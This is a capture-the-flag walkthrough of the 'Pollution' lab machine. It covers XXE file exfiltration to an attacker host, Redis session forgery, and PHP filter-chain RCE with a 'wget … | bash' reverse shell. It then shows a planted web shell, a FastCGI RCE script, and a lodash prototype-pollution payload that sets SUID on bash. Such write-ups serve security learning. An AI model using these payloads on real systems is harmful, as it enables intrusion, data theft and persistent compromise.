---
description: >-
  XXE Injection for Arbitary File read to find creds, FastCGI RCE for user and
  Javascript Prototype Pollution for root.
---

# Pollution

## Gaining Access

As usual, we start with an Nmap scan:

```
$ nmap -p- --min-rate 3000 10.129.106.251    
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-06 22:10 EST
Nmap scan report for 10.129.106.251
Host is up (0.16s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6379/tcp open  redis
```

Redis and HTTP. Because Redis is there, I want to check if it is running any vulnerable version of the service, but further enumeration revealed that there was nothing to note.

```
$ sudo nmap -p 22,80,6379 -sC -sV -O -T4 10.129.106.251
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-06 22:12 EST
Nmap scan report for 10.129.106.251
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db1d5c65729bc64330a52ba0f01ad5fc (RSA)
|   256 4f7956c5bf20f9f14b9238edcefaac78 (ECDSA)
|_  256 df47554f4ad178a89dcdf8a02fc0fca9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Home
|_http-server-header: Apache/2.4.54 (Debian)
6379/tcp open  redis   Redis key-value store
```

### Port 80

Heading to the web service, it is a standard company website.

<figure><img src="../../../.gitbook/assets/image (2810).png" alt=""><figcaption></figcaption></figure>

Howeverm clicking on some objects reveals the `[object Object]` tag, which is a string representation of a Javascript object data type. Playing around with the logins didn't reveal much to me. However, registering a test account and logging in revealed that there was an API somewhere, and that my username `test` was printed on screen.

<figure><img src="../../../.gitbook/assets/image (474).png" alt=""><figcaption></figcaption></figure>

There could be an API backend, but I wasn't able to find it using normal means. Looking at the assets, I could see that this used jQuery 2.1.0. Wasn't of much use however.

<figure><img src="../../../.gitbook/assets/image (729).png" alt=""><figcaption></figcaption></figure>

### Finding Subhosts

I knew that there was some hidden servers or something within the website, as the API hint was quite obvious. Understanding that the website was named 'Collect', I used `collect.htb` as a domain and tried to fuzz vhosts.&#x20;

Regular fuzzing did not do much for me, but when I fuzzed the HTTP Host header using `wfuzz`, I was able to find some results.

<figure><img src="../../../.gitbook/assets/image (769).png" alt=""><figcaption></figcaption></figure>

We can add both of these to the `/etc/hosts` file. The `developers` subdomain requires a password to enter.

<figure><img src="../../../.gitbook/assets/image (1021).png" alt=""><figcaption></figcaption></figure>

### Forum

This was a forum page for users to write stuff, and there was some threads and a user that was active.

<figure><img src="../../../.gitbook/assets/image (3456).png" alt=""><figcaption></figcaption></figure>

Reading some of the posts, I saw that there was indeed a Pollution API somewhere.

<figure><img src="../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

I created a test user to download that file. The file contained a load of base64 encoded requests and stuff. Reading the requests, we can see that there was one to the /admin panel on the main website.

<figure><img src="../../../.gitbook/assets/image (1333).png" alt=""><figcaption></figcaption></figure>

Decoding the request, we find that it gives us a token.

```http
POST /set/role/admin HTTP/1.1
Host: collect.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=r8qne20hig1k3li6prgk91t33j
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

token=ddac62a28254561001277727cb397baf
```

By replacing the PHPSESSID with our own created user, we can become an administrator by sending the same POST request to the website.

<figure><img src="../../../.gitbook/assets/image (2837).png" alt=""><figcaption></figcaption></figure>

From here, we can register our own user and gain access to the API stuff.

### API

Reading the reques send to the API, we can see that this processes requests using XML.

```http
POST /api HTTP/1.1
Host: 10.129.106.251
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-type: application/x-www-form-urlencoded
Content-Length: 178
Origin: http://10.129.106.251
Connection: close
Referer: http://10.129.106.251/admin
Cookie: PHPSESSID=e50hu9lk5rkblb7tdlm3310fk4



manage_api=<?xml version="1.0" encoding="UTF-8"?><root><method>POST</method><uri>/auth/register</uri><user><username>test</username><password>password123</password></user></root>
```

### XXE Injection for File read

We can try XXE Injection, however regular payloads do not work. We can bypass this by creating a DTD file and make the website send a GET request to process that file.

After some trial and error, I found that using the `php://filter/` method worked through base64 encoding the stuff. I was able to read some of the files.

```xml
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource='>
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://10.10.14.152/?file=%file;'>">
%eval;
%exfiltrate;
```

<figure><img src="../../../.gitbook/assets/image (3507).png" alt=""><figcaption></figcaption></figure>

Payload used:

```http
manage_api=<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.10.14.152/test.dtd"> %xxe;]><root><method>POST</method><uri>/auth/register</uri><user><username>test</username><password>password123</password></user></root>
```

From here, I wanted to read the `/var/www/developers/.htpasswd` file since we found a password on it earlier.

<figure><img src="../../../.gitbook/assets/image (305).png" alt=""><figcaption></figcaption></figure>

Using `john`, we could crack the hash to give `r0cket` as the password. We were confronted with another login page.

<figure><img src="../../../.gitbook/assets/image (4039).png" alt=""><figcaption></figcaption></figure>

This time, we need to find credentials elsewhere. That `redis` instance is likely where this password is hidden. We cannot read the `/etc/redis` file without root permissions, so there likely is another file located somewhere.

I tried checking for `config.php` files but was unable to find any. I knew that we had to go 'up' one directory because the current directory contained nothing, Some googling about Redis led me to the `bootstrp.php` file, which worked. It was located at `../bootstrp.php`.

<figure><img src="../../../.gitbook/assets/image (1026).png" alt=""><figcaption></figcaption></figure>

### Redis

We can login via `redis-cli` wth credentials.

<figure><img src="../../../.gitbook/assets/image (1074).png" alt=""><figcaption></figcaption></figure>

Then, we can list the keys and other information within this database.

<figure><img src="../../../.gitbook/assets/image (2743).png" alt=""><figcaption></figcaption></figure>

Seems that all of these keys are empty arrays, for some reason. I registered another user within the `collect.htb` website to see if we can do any other things.

<figure><img src="../../../.gitbook/assets/image (3769).png" alt=""><figcaption></figcaption></figure>

So we have this, and we need a way to authenticate ourselves.  For this, we can set our role to `admin` and also set a `auth|s:1:\"a\"` bit, because this would grant us access to the `developers` endpoint.

We can use this command to do so:

`set PHPREDIS_SESSION:e50hu9lk5rkblb7tdlm3310fk4 "username|s:10:"testing123";role|s:5:"admin";auth|s:1:"a";"`

Then, replace the cookie and login to the `developers.collect.htb` endpoint.&#x20;

<figure><img src="../../../.gitbook/assets/image (2527).png" alt=""><figcaption></figcaption></figure>

### RCE

The `page` parameter in this website is rather suspicious, and we can try to fuzz for RCE / LFI weaknesses. The page itself has nothing to offer, and each time we go to a different site the `page` parameter changes. This was rather suspicious, but I was unable to gain any form of LFI to read other files.

I assumed that there was some type of backend check for this parameter. I then found this on Hacktricks, that was essentially some type of PHP Filter bypass. This confirms that RCE is possible through that parameter.

{% embed url="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters" %}

This tool linked worked like a charm:

{% embed url="https://github.com/synacktiv/php_filter_chain_generator" %}

This had some form of length barrier that was crashing the request. As such, we can use **PHP Shorthand Code,** which is basically a short form for PHP code. This involves the usage of the `<?=` tags. Then, since we have RCE, we can host the shell on my web server instead.

<figure><img src="../../../.gitbook/assets/image (3622).png" alt=""><figcaption></figcaption></figure>

Testing this out, I used this command ``<?= `id` ?>.``

This worked out pretty well as I was able to see the output here.

<figure><img src="../../../.gitbook/assets/image (3584).png" alt=""><figcaption></figcaption></figure>

We can then replace the command with ``<?=`wget -O - 10.10.14.152/b|bash` ?>``

Now, we have a reverse shell as `www-data`.

<figure><img src="../../../.gitbook/assets/image (3823).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation to Victor

Victor was the only user on this machine, and we needed to find his credentials or something.

### MySQL Creds

Within the `~/developers/login.php` file, I found some credentials.

<figure><img src="../../../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>

It appears there was a MySQL Instance on the machine running. We can login to that using `mysql -u webapp_user -p`.

Then, we can enumerate this database.

<figure><img src="../../../.gitbook/assets/image (3539).png" alt=""><figcaption></figcaption></figure>

We can find a hash from the `developers` database.

<figure><img src="../../../.gitbook/assets/image (3776).png" alt=""><figcaption></figcaption></figure>

Couldn't crack the hash though.

### Persistence

For some persistance, I dropped a `cmd.php` shell into the `forum` website, so that I can establish RCE at any given time.

<figure><img src="../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

### PHP-FPM

I ran `netstat -tulpn` to see what services were running on the machine, and found that port 9000 was listening to something.

<figure><img src="../../../.gitbook/assets/image (1491).png" alt=""><figcaption></figcaption></figure>

I also ran LinPEAS to find some escalation vectors to victor. This user was also running the `php-fpm` master process or something.

<figure><img src="../../../.gitbook/assets/image (2158).png" alt=""><figcaption></figcaption></figure>

Further enumeration reveals that port 9000 was FastCGI, and this was vulnerable to RCE. Since Victor is running it, this is our privilege escalation vector. We just need to make a script that would give us another reverse shell.

Here's the script;

```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/tmp/index.php" # Exisiting file path

HOST='127.0.0.1'
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```

<figure><img src="../../../.gitbook/assets/image (2362).png" alt=""><figcaption></figcaption></figure>

We can replace the command to get another reverse shell as needed.

<figure><img src="../../../.gitbook/assets/image (1561).png" alt=""><figcaption></figcaption></figure>

From here, we can drop our public key into victor's .ssh folder to SSH in easily, and also grab the user flag.

## Root Escalation

Within Victor's directory, there's a `pollution_api` folder. The `index.js` file specifies that there is this service running on port 3000.

<figure><img src="../../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

Since this box was called pollution, I assumed that there was some Javascript pollution related exploit that would give us root. Within the `controllers` directory, there was this `Message_send.js` script.

```javascript
const Message = require('../models/Message');
const { decodejwt } = require('../functions/jwt');
const _ = require('lodash');
const { exec } = require('child_process');

const messages_send = async(req,res)=>{
    const token = decodejwt(req.headers['x-access-token'])
    if(req.body.text){

        const message = {
            user_sent: token.user,
            title: "Message for admins",
        };

        _.merge(message, req.body);

        exec('/home/victor/pollution_api/log.sh log_message');

        Message.create({
            text: JSON.stringify(message),
            user_sent: token.user
        });

        return res.json({Status: "Ok"});

    }

    return res.json({Status: "Error", Message: "Parameter text not found"});
}

module.exports = { messages_send };
```

So there was this `_.merge` function being used. This function was vulnerable to a Lodash Merge Pollution attack, which allows for RCE as root.&#x20;

Prototype pollution basically allows us to control the default values of the object's properties, and we can tamper with the application logic. Since there is an `exec` function right after this that executes a pre-determined command, we can use this exploit to 'alter' the values passed into this.

This would allow us to change what is being executed. In this case, the root user is likely running this API, hence exploitation would allow for RCE as root.

Hacktricks has some examples of attacks that can be done using this.

{% embed url="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce#exec-exploitation" %}

### Prototype Pollution

First, we would need to get a valid token to interact with the API. Earlier, we did register a user, and we just need to promote this user to an administrator.

We can do this with the MySQL instance we accessed earlier.

<figure><img src="../../../.gitbook/assets/image (3726).png" alt=""><figcaption><p>\</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1319).png" alt=""><figcaption></figcaption></figure>

Now we can login as this user using our credentials.

<figure><img src="../../../.gitbook/assets/image (4029).png" alt=""><figcaption></figcaption></figure>

This would give us a token, which is needed for the `X-Access-Token` header. Reading the documentation for the API through accessing `http://127.0.0.1:3000/documentation`, we can see that we need to send a POST request to `/admin/mesages/send` to interact with the vulnerable function.

```json
{
  "Documentation": {
    "Routes": {
      "/": {
        "Methods": "GET",
        "Params": null
      },
      "/auth/register": {
        "Methods": "POST",
        "Params": {
          "username": "username",
          "password": "password"
        }
      },
      "/auth/login": {
        "Methods": "POST",
        "Params": {
          "username": "username",
          "password": "password"
        }
      },
      "/client": {
        "Methods": "GET",
        "Params": null
      },
      "/admin/messages": {
        "Methods": "POST",
        "Params": {
          "id": "messageid"
        }
      },
      "/admin/messages/send": {
        "Methods": "POST",
        "Params": {
          "text": "message text"
        }
      }
    }
  }
}
```

Now, we need to construct a paylaod that would pollute the `exec` function that comes after. What we would want to do is first create a new 'shell' using `/proc/self/exe` which would spawn another thread for us to execute the command we want. The only difficulty here is fitting it into a single JSON object, but the payload is available at Hacktricks under the `execSync` exploit.

As such, we can construct this command:

{% code overflow="wrap" %}
```bash
curl http://127.0.0.1:3000/admin/messages/send -H "X-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY3MDM5MjcyMiwiZXhwIjoxNjcwMzk2MzIyfQ.Ry9ngHgkESmKPTU624I_p7rPSAKAky-B6H_Ddzk1duw" -H "content-type: application/json" -d '{"text":{"constructor":{"prototype":{"shell":"/proc/self/exe","argv0":"console.log(require(\"child_process\").execSync(\"chmod +s /usr/bin/bash\").toString())//","NODE_OPTIONS":"--require /proc/self/cmdline"}}}}'
```
{% endcode %}

This would call a child\_process to execute `chmod +s /usr/bin/bash`.&#x20;

<figure><img src="../../../.gitbook/assets/image (766).png" alt=""><figcaption></figcaption></figure>

We are now root, and we can capture the root flag.
